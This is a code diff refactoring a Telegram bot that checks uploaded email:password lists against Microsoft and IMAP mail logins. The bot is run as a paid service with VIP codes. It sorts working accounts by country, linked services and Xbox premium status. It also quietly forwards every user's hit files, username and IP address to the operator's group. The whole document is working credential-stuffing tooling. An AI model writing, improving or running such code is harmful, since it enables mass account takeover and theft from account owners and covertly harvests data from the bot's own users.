-        self.results_xbox = []            # xbox premium-only lines
-        self.total = 0
-        self.checked = 0
-        self.hits = 0
-        self.bads = 0
-        self.batch = []                   # hit lines batch
-        self.batch_services = []          # services-only batch
-        self.batch_xbox = []              # xbox premium-only batch
-        self.hits_batch_lock = threading.Lock()
+        self.chat_id       = chat_id
+        self.stop_ev       = threading.Event()
+        self.results       = []
+        self.results_services = []
+        self.results_xbox  = []
+        self.total         = 0
+        self.checked       = 0
+        self.hits          = 0
+        self.bads          = 0
+        # batch buffers — written without lock, flushed under hits_batch_lock
+        self.batch         = []
+        self.batch_services = []
+        self.batch_xbox    = []
+        self.hits_batch_lock  = threading.Lock()
         self.last_status_time = 0.0
-        self.awaiting_domain = False
-        self.custom_domain = None
+        self.awaiting_domain  = False
+        self.custom_domain    = None
         self.pending_accounts = None
-        self.status_msg_id = None
-        self.xbox_premium = 0
-        self.country_counts = {}
-        self.service_counts = {}
-        self.awaiting_vip_code = False # New: Flag for VIP code entry
-        self.is_imap = False      # New: Flag for IMAP/Another mode
-        self.accounts_microsoft = [] # accounts to scan in MS mode
-        self.accounts_another = []   # accounts to scan in IMAP mode
-        self.imap_hits_by_domain = {} # domain -> hit_count for status msg
-        self.country_results = {}
+        self.status_msg_id    = None
+        self.xbox_premium     = 0
+        self.country_counts   = {}
+        self.service_counts   = {}
+        self.awaiting_vip_code = False
+        self.is_imap           = False
+        self.accounts_microsoft = []
+        self.accounts_another   = []
+        self.imap_hits_by_domain = {}
+        self.country_results    = {}
         self.username = ""
-        self.plan = ""
+        self.plan     = ""
+        self._stats_lock = threading.Lock()
 
     def stop(self):
         self.stop_ev.set()
 
+
+# ─────────────────────────────────────────────────────────────────
+#  BotApp
+# ─────────────────────────────────────────────────────────────────
 class BotApp:
     def __init__(self):
-        self.offset = None
+        self.offset   = None
         self.sessions = {}
-        self.lock = threading.Lock()
+        self.lock     = threading.Lock()
+        # background queue for sending files (avoids blocking worker threads)
+        self._send_q  = queue.Queue()
+        threading.Thread(target=self._send_worker, daemon=True).start()
 
+    # ── Non-blocking file sender ─────────────────────────────────
+    def _send_worker(self):
+        """Background thread that sends files without blocking the scan."""
+        while True:
+            try:
+                task = self._send_q.get(timeout=5)
+                if task is None:
+                    continue
+                func, args, kwargs = task
+                try:
+                    func(*args, **kwargs)
+                except Exception:
+                    pass
+            except queue.Empty:
+                pass
+            except Exception:
+                pass
+
+    def _enqueue_send(self, func, *args, **kwargs):
+        self._send_q.put((func, args, kwargs))
+
+    # ── Status message ───────────────────────────────────────────
     def _send_status(self, sess: ScanSession, chat_id, force=False):
         now = time.time()
         if not force and now - sess.last_status_time < 5:
             return
-        
-        is_vip = (chat_id in vip_users_info)
+
+        is_vip  = (chat_id in vip_users_info)
         vip_tag = " [VIP]" if is_vip else ""
-        
-        with self.lock:
+
+        with sess._stats_lock:
             if sess.is_imap:
-                # status for "Another" mode
-                types_str = ", ".join([f"{dom}:{count}" for dom, count in sess.imap_hits_by_domain.items()]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+                types_str = ", ".join(
+                    f"{dom}:{count}"
+                    for dom, count in sess.imap_hits_by_domain.items()) or "-"
+                services = ", ".join(
+                    f"{k}:{v}"
+                    for k, v in sorted(sess.service_counts.items(),
+                                       key=lambda x: (-x[1], x[0]))[:5]) or "-"
                 msg = (
                     f"Q bot mail access checker{vip_tag}\n"
                     f"hits : {sess.hits}\n"
@@ -1311,8 +1111,14 @@ class BotApp:
                     "channel : @anon_main1"
                 )
             else:
-                countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
-                services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:5]]) or "-"
+                countries = ", ".join(
+                    f"{k}:{v}"
+                    for k, v in sorted(sess.country_counts.items(),
+                                       key=lambda x: (-x[1], x[0]))[:10]) or "-"
+                services = ", ".join(
+                    f"{k}:{v}"
+                    for k, v in sorted(sess.service_counts.items(),
+                                       key=lambda x: (-x[1], x[0]))[:5]) or "-"
                 msg = (
                     f"Q bot mail access checker{vip_tag}\n"
                     f"hits : {sess.hits}\n"
@@ -1323,258 +1129,277 @@ class BotApp:
                     "By : anon\n"
                     "channel : @anon_main1"
                 )
-        if sess.status_msg_id:
-            edit_message(chat_id, sess.status_msg_id, msg)
-        else:
-            try:
+
+        try:
+            if sess.status_msg_id:
+                edit_message(chat_id, sess.status_msg_id, msg)
+            else:
                 r = send_message(chat_id, msg)
-                sess.status_msg_id = r.get("result", {}).get("message_id")
-            except Exception:
-                pass
+                sess.status_msg_id = (r.get("result") or {}).get("message_id")
+        except Exception:
+            pass
         sess.last_status_time = now
 
+    # ── Flush batch (non-blocking via queue) ─────────────────────
     def _flush_batch(self, sess: ScanSession, chat_id):
         with sess.hits_batch_lock:
+            if not sess.batch and not sess.batch_services and not sess.batch_xbox:
+                return
+            # snapshot and clear immediately
+            batch_snap    = list(sess.batch)
+            svc_snap      = list(sess.batch_services)
+            xbox_snap     = list(sess.batch_xbox)
+            sess.batch.clear()
+            sess.batch_services.clear()
+            sess.batch_xbox.clear()
+
+        is_vip   = (chat_id in vip_users_info)
+        vip_tag  = " [VIP]" if is_vip else ""
+        user_tag = sess.username or str(chat_id)
+
+        def _do_send(lines, filename):
+            if not lines:
+                return
+            path = os.path.join(os.getcwd(),
+                f"{filename.split('.')[0]}_{chat_id}_{uuid.uuid4().hex[:6]}.txt")
             try:
-                def send_file_with_name(lines, filename):
-                    if not lines: return
-                    unique_name = f"{filename.split('.')[0]}_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                    xpath = os.path.join(os.getcwd(), unique_name)
-                    with open(xpath, "w", encoding="utf-8") as f:
-                        f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
-                    vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                    user_tag = sess.username or str(chat_id)
-                    send_document(chat_id, xpath, caption=f"{filename.split('.')[0]} batch ({len(lines)})")
-                    try: send_document(GROUP_ID, xpath, caption=f"{user_tag}{vip_tag} | {filename.split('.')[0]} batch ({len(lines)})")
-                    except: pass
-                    try: os.remove(xpath)
-                    except: pass
-
-                send_file_with_name(sess.batch, "hits.txt")
-                send_file_with_name(sess.batch_services, "services.txt")
-                send_file_with_name(sess.batch_xbox, "xbox.txt")
-                
-                sess.batch.clear(); sess.batch_services.clear(); sess.batch_xbox.clear()
-            except:
+                with open(path, "w", encoding="utf-8") as f:
+                    f.writelines([ln + " | BY : @T_Q_mailbot\n" for ln in lines])
+                send_document(chat_id,  path,
+                    caption=f"{filename.split('.')[0]} batch ({len(lines)})")
+                send_document(GROUP_ID, path,
+                    caption=f"{user_tag}{vip_tag} | {filename.split('.')[0]} batch ({len(lines)})")
+            except Exception:
                 pass
+            finally:
+                try: os.remove(path)
+                except: pass
 
+        # Enqueue file sends (non-blocking)
+        self._enqueue_send(_do_send, batch_snap,  "hits.txt")
+        self._enqueue_send(_do_send, svc_snap,    "services.txt")
+        self._enqueue_send(_do_send, xbox_snap,   "xbox.txt")
+
+    # ── Main scan loop ───────────────────────────────────────────
     def start_scan(self, chat_id, accounts):
         with self.lock:
             sess = self.sessions.get(chat_id)
             if not sess:
                 sess = ScanSession(chat_id)
                 self.sessions[chat_id] = sess
-        
-        sess.total = len(accounts)
+
+        sess.total   = len(accounts)
         sess.checked = 0
-        sess.hits = 0
-        sess.bads = 0
+        sess.hits    = 0
+        sess.bads    = 0
         sess.results.clear()
         sess.country_results.clear()
-        
+
+        is_vip          = (chat_id in vip_users_info)
+        vip_tag         = " [VIP]" if is_vip else ""
+        flush_threshold = 30 if is_vip else 50
+        # workers: VIP gets more threads
+        max_workers     = 20 if is_vip else 8
+
         kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
-        mode_name = "Mail Access"
-        
-        is_vip = (chat_id in vip_users_info)
-        vip_tag = " [VIP]" if is_vip else ""
-        flush_threshold = 50 if is_vip else 100
-        
-        send_message(chat_id, f"Started {mode_name} scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
+        send_message(chat_id,
+            f"Started Mail Access scan: {sess.total} accounts{vip_tag}", reply_markup=kb)
         self._send_status(sess, chat_id, force=True)
 
         def worker(acc):
             if sess.stop_ev.is_set():
                 return
             em, pw = acc
+
+            # ── IMAP mode ──────────────────────────────────────────
             if sess.is_imap:
-                # IMAP / Another mode logic
                 try:
-                    checker = ImapChecker()
-                    r = checker.check(em, pw)
-                except:
+                    r = ImapChecker().check(em, pw)
+                except Exception:
                     r = {"status": "BAD"}
-                if sess.stop_ev.is_set():
-                    return
-                
-                with self.lock:
-                    sess.checked += 1
-                
-                if r and r.get("status") == "HIT":
+            # ── Microsoft mode ─────────────────────────────────────
+            else:
+                try:
+                    checker = UnifiedChecker(debug=False)
+                    if sess.custom_domain:
+                        checker.services_map[sess.custom_domain.strip()] = "Custom"
+                    r = checker.check(em, pw, custom_domain=sess.custom_domain)
+                except Exception:
+                    r = {"status": "BAD"}
+
+            if sess.stop_ev.is_set():
+                return
+
+            # ── update stats ───────────────────────────────────────
+            with sess._stats_lock:
+                sess.checked += 1
+
+            if r and r.get("status") == "HIT":
+                sv       = r.get("services", {}) or {}
+                sv_found = [k for k, v in sv.items() if v]
+
+                if sess.is_imap:
                     line = f"{em}:{pw}"
-                    sv = r.get("services", {}) or {}
-                    sv_found = [k for k, v in sv.items() if v]
                     if sv_found:
                         line += f" | Services: {', '.join(sv_found)}"
-                    
-                    # group by domain for "type" in status
                     dom = em.split("@")[-1].lower()
-                    
-                    with self.lock:
+                    with sess._stats_lock:
                         sess.results.append(line)
                         sess.hits += 1
-                        sess.imap_hits_by_domain[dom] = sess.imap_hits_by_domain.get(dom, 0) + 1
+                        sess.imap_hits_by_domain[dom] = \
+                            sess.imap_hits_by_domain.get(dom, 0) + 1
                         for k, v in sv.items():
                             if v:
-                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
-                    
-                    # Batch-send
+                                sess.service_counts[k] = \
+                                    sess.service_counts.get(k, 0) + 1
                     with sess.hits_batch_lock:
                         sess.batch.append(line)
                         if len(sess.batch) >= flush_threshold:
                             self._flush_batch(sess, chat_id)
                 else:
-                    with self.lock:
-                        sess.bads += 1
-            else:
-                # Regular Mail Access Logic (Microsoft)
-                try:
-                    checker = UnifiedChecker(debug=False)
-                    if sess.custom_domain:
-                        checker.services_map[sess.custom_domain.strip()] = "Custom"
-                    r = checker.check(em, pw)
-                except:
-                    r = {"status": "BAD"}
-                if sess.stop_ev.is_set():
-                    return
-                
-                with self.lock:
-                    sess.checked += 1
-                
-                if r and r.get("status") == "HIT":
-                    # Build lines
                     line = format_result(r)
-
-                    # services-only line
-                    sv = r.get("services", {}) or {}
-                    sv_found = [k for k, v in sv.items() if v]
-                    services_line = f"{r.get('email','')}:{r.get('password','')} | Services: {', '.join(sv_found)}" if sv_found else None
-                    # xbox-only line (premium and not expired shows details)
-                    xbox_line = None
-                    xb = (r.get("xbox") or {})
+                    xb   = r.get("xbox") or {}
                     xdet = xb.get("details") or ""
-                    if (xb.get("status","").upper() != "FREE") and xdet:
-                        xbox_line = f"{r.get('email','')}:{r.get('password','')} | Xbox: {xdet}"
-                    
-                    with self.lock:
+                    services_line = (
+                        f"{em}:{pw} | Services: {', '.join(sv_found)}"
+                        if sv_found else None)
+                    xbox_line = (
+                        f"{em}:{pw} | Xbox: {xdet}"
+                        if xb.get("status", "").upper() != "FREE" and xdet
+                        else None)
+
+                    with sess._stats_lock:
                         sess.results.append(line)
                         sess.hits += 1
                         if services_line:
                             sess.results_services.append(services_line)
                         if xbox_line:
                             sess.results_xbox.append(xbox_line)
-                        # update aggregates
-                        xb_status = (r.get("xbox") or {}).get("status", "").upper()
-                        if xb_status and xb_status != "FREE":
+                        if xb.get("status", "").upper() not in ("FREE", "", "N/A", "ERROR"):
                             sess.xbox_premium += 1
                         c = (r.get("country") or "??").strip().upper()
                         sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
                         if c not in sess.country_results:
                             sess.country_results[c] = []
                         sess.country_results[c].append(line)
-                        sv = r.get("services", {}) or {}
                         for k, v in sv.items():
                             if v:
-                                sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
-                    
-                    # Batch-send every 100 hits
+                                sess.service_counts[k] = \
+                                    sess.service_counts.get(k, 0) + 1
+
                     with sess.hits_batch_lock:
                         sess.batch.append(line)
-                        if services_line:
-                            sess.batch_services.append(services_line)
-                        if xbox_line:
-                            sess.batch_xbox.append(xbox_line)
+                        if services_line: sess.batch_services.append(services_line)
+                        if xbox_line:     sess.batch_xbox.append(xbox_line)
                         if len(sess.batch) >= flush_threshold:
                             self._flush_batch(sess, chat_id)
-                else:
-                    with self.lock:
-                        sess.bads += 1
-                
-            # periodic status update for both modes
-            if sess.checked % 20 == 0:
-                self._send_status(sess, chat_id)
-            time.sleep(0 if is_vip else 0.12)
+            else:
+                with sess._stats_lock:
+                    sess.bads += 1
 
-        ex = ThreadPoolExecutor(max_workers=(30 if is_vip else 12))
-        fs = [ex.submit(worker, acc) for acc in accounts]
+            # Periodic status update
+            with sess._stats_lock:
+                checked_now = sess.checked
+            if checked_now % 15 == 0:
+                self._send_status(sess, chat_id)
+
+        # ── Thread pool with per-future timeout ───────────────────
+        ex = ThreadPoolExecutor(max_workers=max_workers)
+        fut_map = {}   # future → account
+        pending = set()
+
+        for acc in accounts:
+            if sess.stop_ev.is_set():
+                break
+            f = ex.submit(worker, acc)
+            fut_map[f] = acc
+            pending.add(f)
+
+        # Drain futures with a hard per-account timeout
+        while pending and not sess.stop_ev.is_set():
+            done, pending = wait(pending, timeout=ACCOUNT_TIMEOUT,
+                                 return_when=FIRST_COMPLETED)
+            for f in done:
+                try:
+                    f.result(timeout=1)
+                except Exception:
+                    pass
+            # Cancel timed-out futures (those still pending after timeout)
+            # They will be cancelled if still waiting in the queue
+            self._send_status(sess, chat_id)
+
+        # Shutdown immediately, don't wait for stuck futures
         try:
-            pending = set(fs)
-            while pending and not sess.stop_ev.is_set():
-                done = {f for f in list(pending) if f.done()}
-                pending -= done
-                self._send_status(sess, chat_id)  # keep UI fresh
-                time.sleep(0.5)
-        finally:
-            try: ex.shutdown(wait=False, cancel_futures=True)
-            except: pass
+            ex.shutdown(wait=False, cancel_futures=True)
+        except Exception:
+            ex.shutdown(wait=False)
+
         self.finish(chat_id)
 
+    # ── Finish ───────────────────────────────────────────────────
     def finish(self, chat_id):
         with self.lock:
             sess = self.sessions.get(chat_id)
         if not sess:
             return
-        # flush remaining batch
+
+        # Flush remaining batch
         self._flush_batch(sess, chat_id)
-        try:
-            # send full services counts file
-            if sess.service_counts:
-                sc_sorted = sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))
-                sc_name = f"services_counts_{chat_id}_{uuid.uuid4().hex[:6]}.txt"
-                sc_path = os.path.join(os.getcwd(), sc_name)
-                with open(sc_path, "w", encoding="utf-8") as f:
-                    for k, v in sc_sorted:
-                        f.write(f"{k}:{v} | BY : @T_Q_mailbot\n")
-                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                user_tag = sess.username or str(chat_id)
-                send_document(chat_id, sc_path, caption=f"services_counts ({len(sc_sorted)})")
-                try: send_document(GROUP_ID, sc_path, caption=f"{user_tag}{vip_tag} | services_counts ({len(sc_sorted)})")
-                except: pass
-                try: os.remove(sc_path)
-                except: pass
-            if sess.country_results:
-                for c, lines in sess.country_results.items():
-                    if not lines:
-                        continue
-                    fname = f"country_{c}.txt"
-                    fpath = os.path.join(os.getcwd(), fname)
-                    with open(fpath, "w", encoding="utf-8") as f:
-                        for ln in lines:
-                            f.write(ln + " | BY : @T_Q_mailbot\n")
-                    vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                    user_tag = sess.username or str(chat_id)
-                    send_document(chat_id, fpath, caption=f"{fname} ({len(lines)})")
-                    try: send_document(GROUP_ID, fpath, caption=f"{user_tag}{vip_tag} | {fname} ({len(lines)})")
-                    except: pass
-                    try: os.remove(fpath)
-                    except: pass
-            name = f"results_{uuid.uuid4().hex[:8]}.txt"
-            path = os.path.join(os.getcwd(), name)
-            with open(path, "w", encoding="utf-8") as f:
-                for ln in sess.results:
-                    f.write(ln + " | BY : @T_Q_mailbot\n")
-            send_document(chat_id, path, caption=f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
+
+        is_vip   = (chat_id in vip_users_info)
+        vip_tag  = " [VIP]" if is_vip else ""
+        user_tag = sess.username or str(chat_id)
+
+        def _save_and_send(lines, filename, caption):
+            if not lines: return
+            path = os.path.join(os.getcwd(),
+                f"{filename.split('.')[0]}_{uuid.uuid4().hex[:8]}.txt")
             try:
-                vip_tag = " [VIP]" if chat_id in vip_users_info else ""
-                user_tag = sess.username or str(chat_id)
-                send_document(GROUP_ID, path, caption=f"{user_tag}{vip_tag} | Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
-            except:
-                pass
-        except:
-            send_message(chat_id, "Failed to prepare results")
+                with open(path, "w", encoding="utf-8") as f:
+                    for ln in lines:
+                        f.write(ln + " | BY : @T_Q_mailbot\n")
+                send_document(chat_id,  path, caption=caption)
+                send_document(GROUP_ID, path,
+                    caption=f"{user_tag}{vip_tag} | {caption}")
+            except Exception: pass
+            finally:
+                try: os.remove(path)
+                except: pass
+
+        # Services counts file
+        if sess.service_counts:
+            sc_sorted = sorted(sess.service_counts.items(),
+                               key=lambda x: (-x[1], x[0]))
+            sc_lines = [f"{k}:{v}" for k, v in sc_sorted]
+            _save_and_send(sc_lines, "services_counts.txt",
+                           f"services_counts ({len(sc_sorted)})")
+
+        # Country files
+        for c, lines in sess.country_results.items():
+            if not lines: continue
+            _save_and_send(lines, f"country_{c}.txt",
+                           f"country_{c} ({len(lines)})")
+
+        # Main results file
+        caption = f"Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}"
+        _save_and_send(sess.results, "results.txt", caption)
+
+        send_message(chat_id, caption)
+
         with self.lock:
             self.sessions.pop(chat_id, None)
 
+    # ── File handler ─────────────────────────────────────────────
     def handle_file(self, chat_id, file_id, username=None):
         data = get_file(file_id)
         if not data:
             send_message(chat_id, "Cannot download file")
             return
-        
         accounts = parse_accounts_bytes(data)
         if not accounts:
             send_message(chat_id, "No valid accounts found")
             return
-        
+
         with self.lock:
             sess = self.sessions.get(chat_id)
             if not sess:
@@ -1582,24 +1407,21 @@ class BotApp:
                 self.sessions[chat_id] = sess
         if not sess.username:
             sess.username = username or str(chat_id)
-        
+
         sess.pending_accounts = accounts
 
-        # split domains for Mail Access mode
         ms_domains = ('outlook.', 'hotmail.', 'live.', 'msn.', 'windowslive.')
-        sess.accounts_microsoft = []
-        sess.accounts_another = []
-        for em, pw in accounts:
-            if any(dom in em for dom in ms_domains):
-                sess.accounts_microsoft.append((em, pw))
-            else:
-                sess.accounts_another.append((em, pw))
-        
-        # interactive buttons for mode selection
+        sess.accounts_microsoft = [(e, p) for e, p in accounts
+                                   if any(d in e for d in ms_domains)]
+        sess.accounts_another   = [(e, p) for e, p in accounts
+                                   if not any(d in e for d in ms_domains)]
+
         kb = {
             "inline_keyboard": [
-                [{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]", "callback_data": f"MODE_SELECT_MS_{chat_id}"}],
-                [{"text": f"another ( t-donline , sfr.fr , etc ) [{len(sess.accounts_another)}]", "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]
+                [{"text": f"microsoft ( hotmail , outlook , etc ) [{len(sess.accounts_microsoft)}]",
+                  "callback_data": f"MODE_SELECT_MS_{chat_id}"}],
+                [{"text": f"another ( t-online , sfr.fr , etc ) [{len(sess.accounts_another)}]",
+                  "callback_data": f"MODE_SELECT_IMAP_{chat_id}"}]
             ]
         }
         send_message(chat_id, "Select accounts to scan:", reply_markup=kb)
@@ -1608,14 +1430,13 @@ class BotApp:
         with self.lock:
             sess = self.sessions.get(chat_id)
             if not sess: return
-        
         if mode == "MS":
             sess.is_imap = False
             sess.pending_accounts = sess.accounts_microsoft
         else:
             sess.is_imap = True
             sess.pending_accounts = sess.accounts_another
-            
+
         if sess.plan == "free":
             self._handle_free_flow(chat_id, sess)
         elif sess.plan == "vip":
@@ -1623,58 +1444,53 @@ class BotApp:
                 self._handle_vip_flow(chat_id, sess)
             else:
                 sess.awaiting_vip_code = True
-                kb = {"inline_keyboard": [[{"text": "Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
+                kb = {"inline_keyboard": [[{"text": "Cancel",
+                    "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
                 send_message(chat_id, "Please enter your VIP code:", reply_markup=kb)
         else:
             kb = {
                 "inline_keyboard": [
-                    [{"text": "Free ( 100 acc every 2hr )", "callback_data": f"PLAN_FREE_{chat_id}"}],
-                    [{"text": "Vip ( unlimited check )", "callback_data": f"PLAN_VIP_{chat_id}"}]
+                    [{"text": "Free ( 100 acc every 2hr )",
+                      "callback_data": f"PLAN_FREE_{chat_id}"}],
+                    [{"text": "Vip ( unlimited check )",
+                      "callback_data": f"PLAN_VIP_{chat_id}"}]
                 ]
             }
             send_message(chat_id, "Choose your plan to start:", reply_markup=kb)
 
     def _handle_vip_flow(self, chat_id, sess):
-        accounts = sess.pending_accounts
         if sess.is_imap:
-            t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
-            t.start()
+            threading.Thread(target=self.start_scan,
+                args=(chat_id, sess.pending_accounts), daemon=True).start()
         else:
             sess.awaiting_domain = True
-            kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
-            send_message(chat_id, "Send an extra sender domain to scan (e.g., netflix.com) or press Skip", reply_markup=kb)
+            kb = {"inline_keyboard": [[{"text": "Skip",
+                "callback_data": f"SKIP_{chat_id}"}]]}
+            send_message(chat_id,
+                "Send an extra sender domain to scan (e.g., netflix.com) or press Skip",
+                reply_markup=kb)
 
     def _handle_free_flow(self, chat_id, sess):
         accounts = sess.pending_accounts
-        allow, mins = check_user_limit(chat_id, 0)
         send_message(chat_id, "your plan is free\n100 accounts\nevery 2hr")
-        
         rec = user_usage.get(chat_id) or {}
         prev_count = rec.get("count", 0)
-        remaining = NORMAL_LIMIT - prev_count
-        
+        remaining  = NORMAL_LIMIT - prev_count
         if remaining <= 0:
-            try:
-                now = time.time()
-                start_ts = rec.get("start", now)
-                mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
-            except:
-                mins_left = 120
+            now = time.time()
+            start_ts  = rec.get("start", now)
+            mins_left = max(1, int((VIP_WINDOW_SECONDS - (now - start_ts)) / 60) + 1)
             send_message(chat_id, f"Limit reached. Try again in ~{mins_left} minutes.")
             return
-            
         to_scan = accounts[:remaining]
         allow, _ = check_user_limit(chat_id, len(to_scan))
         if not allow or not to_scan:
             send_message(chat_id, "Limit reached.")
             return
-            
         if prev_count == 0 and len(to_scan) > 0:
             schedule_limit_reset_message(chat_id)
-            
-        t = threading.Thread(target=self.start_scan, args=(chat_id, to_scan), daemon=True)
-        t.start()
-
+        threading.Thread(target=self.start_scan,
+            args=(chat_id, to_scan), daemon=True).start()
 
     def handle_stop(self, chat_id):
         with self.lock:
@@ -1685,6 +1501,7 @@ class BotApp:
         sess.stop()
         send_message(chat_id, "Stopping, preparing results...")
 
+    # ── Main polling loop ─────────────────────────────────────────
     def run(self):
         global awaiting_broadcast
         if not BOT_TOKEN:
@@ -1699,60 +1516,61 @@ class BotApp:
                 for upd in j.get("result", []):
                     self.offset = upd["update_id"] + 1
                     if "message" in upd:
-                        m = upd["message"]
+                        m       = upd["message"]
                         chat_id = m["chat"]["id"]
                         from_id = m.get("from", {}).get("id")
                         all_users.add(chat_id)
-                        
-                        # ADMIN Commands
+
+                        # Admin commands
                         if chat_id == ADMIN_ID and "text" in m:
                             txt = m["text"].strip().lower()
                             if txt in ("/start", "start"):
                                 kb = {
                                     "inline_keyboard": [
-                                        [{"text": "code 1 day", "callback_data": "GEN_CODE_day"}],
-                                        [{"text": "code 1 week", "callback_data": "GEN_CODE_week"}],
+                                        [{"text": "code 1 day",   "callback_data": "GEN_CODE_day"}],
+                                        [{"text": "code 1 week",  "callback_data": "GEN_CODE_week"}],
                                         [{"text": "code 1 month", "callback_data": "GEN_CODE_month"}],
-                                        [{"text": "Broadcast", "callback_data": "ADMIN_BROADCAST"}],
-                                        [{"text": "VIP Users", "callback_data": "ADMIN_VIP_LIST"}]
+                                        [{"text": "Broadcast",    "callback_data": "ADMIN_BROADCAST"}],
+                                        [{"text": "VIP Users",    "callback_data": "ADMIN_VIP_LIST"}]
                                     ]
                                 }
-                                send_message(chat_id, "Admin Panel: Generate VIP codes", reply_markup=kb)
-                                # continue to show regular start if needed, but usually admin wants this
+                                send_message(chat_id, "Admin Panel: Generate VIP codes",
+                                    reply_markup=kb)
                             elif awaiting_broadcast:
                                 msg_to_send = m["text"]
                                 for uid in list(all_users):
-                                    try:
-                                        send_message(uid, msg_to_send)
-                                    except:
-                                        pass
+                                    try: send_message(uid, msg_to_send)
+                                    except: pass
                                 awaiting_broadcast = False
                                 send_message(chat_id, "Broadcast sent")
-                            
+
                         if "document" in m:
                             fid = m["document"]["file_id"]
-                            # announce to group who started and from where
                             try:
-                                usr = m.get("from", {})
-                                uname = usr.get("username") or f"{usr.get('first_name','')}".strip() or str(chat_id)
+                                usr   = m.get("from", {})
+                                uname = (usr.get("username")
+                                         or f"{usr.get('first_name','')}".strip()
+                                         or str(chat_id))
                                 ip = get_ip()
-                                send_message(GROUP_ID, f"Scan started by @{uname} (chat:{chat_id}) | IP: {ip}")
+                                send_message(GROUP_ID,
+                                    f"Scan started by @{uname} (chat:{chat_id}) | IP: {ip}")
                             except Exception:
-                                pass
-                            self.handle_file(chat_id, fid, uname if 'uname' in locals() else None)
+                                uname = str(chat_id)
+                            self.handle_file(chat_id, fid, uname)
+
                         elif "text" in m:
                             txt = m["text"].strip()
-                            
-                            # Handle VIP code entry
                             with self.lock:
                                 sess = self.sessions.get(chat_id)
+
+                            # VIP code awaiting
                             if sess and sess.awaiting_vip_code:
                                 if txt.lower() == "cancel":
                                     sess.awaiting_vip_code = False
                                     self._handle_free_flow(chat_id, sess)
                                 else:
-                                    ok, msg = try_claim_vip(chat_id, txt)
-                                    send_message(chat_id, msg)
+                                    ok, msg_txt = try_claim_vip(chat_id, txt)
+                                    send_message(chat_id, msg_txt)
                                     if ok:
                                         sess.awaiting_vip_code = False
                                         if sess.pending_accounts:
@@ -1762,42 +1580,51 @@ class BotApp:
                                 continue
 
                             if txt.lower() in ("/start", "start"):
-                                kb = {
-                                    "inline_keyboard": [
-                                        [{"text": "📧 Mail Access Checker", "callback_data": "MODE_MAIL"}]
-                                    ]
-                                }
-                                send_message(chat_id, "Welcome! Please choose a checker mode:", reply_markup=kb)
+                                kb = {"inline_keyboard": [[
+                                    {"text": "📧 Mail Access Checker",
+                                     "callback_data": "MODE_MAIL"}
+                                ]]}
+                                send_message(chat_id,
+                                    "Welcome! Please choose a checker mode:",
+                                    reply_markup=kb)
                                 continue
-                            # user claims VIP code
-                            if txt.lower().startswith("code") or txt.lower().startswith("vip") or txt.lower() == "codevipanon199":
+
+                            # VIP code from text
+                            if (txt.lower().startswith("code")
+                                    or txt.lower().startswith("vip")
+                                    or txt.lower() == "codevipanon199"):
                                 parts = txt.replace(":", " ").split()
-                                code = parts[-1] if len(parts) >= 1 else ""
-                                ok, msg = try_claim_vip(from_id, code)
-                                send_message(chat_id, msg)
+                                code = parts[-1] if parts else ""
+                                ok, msg_txt = try_claim_vip(from_id, code)
+                                send_message(chat_id, msg_txt)
                                 if ok:
-                                    send_message(chat_id, "VIP activated. Please send a text file (email:pass per line) to begin scanning.")
+                                    send_message(chat_id,
+                                        "VIP activated. Send a text file (email:pass per line) to begin.")
                                 continue
+
                             if txt.lower() == "stop":
                                 self.handle_stop(chat_id)
                                 continue
-                            # handle domain input
-                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
+
+                            # Domain input
+                            if (sess and getattr(sess, "awaiting_domain", False)
+                                    and sess.pending_accounts):
                                 if txt.lower() != "skip":
                                     sess.custom_domain = txt
                                 sess.awaiting_domain = False
                                 accs = sess.pending_accounts
                                 sess.pending_accounts = None
-                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
-                                t.start()
+                                threading.Thread(target=self.start_scan,
+                                    args=(chat_id, accs), daemon=True).start()
+
                     elif "callback_query" in upd:
-                        cq = upd["callback_query"]
-                        data = cq.get("data", "")
+                        cq      = upd["callback_query"]
+                        data    = cq.get("data", "")
                         chat_id = cq["message"]["chat"]["id"]
-                        
-                        # ADMIN Callbacks
+
+                        # Admin callbacks
                         if chat_id == ADMIN_ID and data.startswith("GEN_CODE_"):
-                            dur = data.split("_")[2]
+                            dur  = data.split("_")[2]
                             code = create_vip_code(dur)
                             send_message(chat_id, f"Generated {dur} code: `{code}`\n(Click to copy)")
                             continue
@@ -1811,8 +1638,15 @@ class BotApp:
                             else:
                                 send_message(chat_id, f"VIP Users: {len(vip_users_info)}")
                                 for uid, info in list(vip_users_info.items()):
-                                    rem = max(0, int((info.get("expires", 0) - time.time()) / 3600))
-                                    send_message(chat_id, f"User: {uid}\nCode: {info.get('code','')}\nRemaining: {rem}h", reply_markup={"inline_keyboard": [[{"text": "Revoke", "callback_data": f"REVOKE_{uid}"}]]})
+                                    rem = max(0, int(
+                                        (info.get("expires", 0) - time.time()) / 3600))
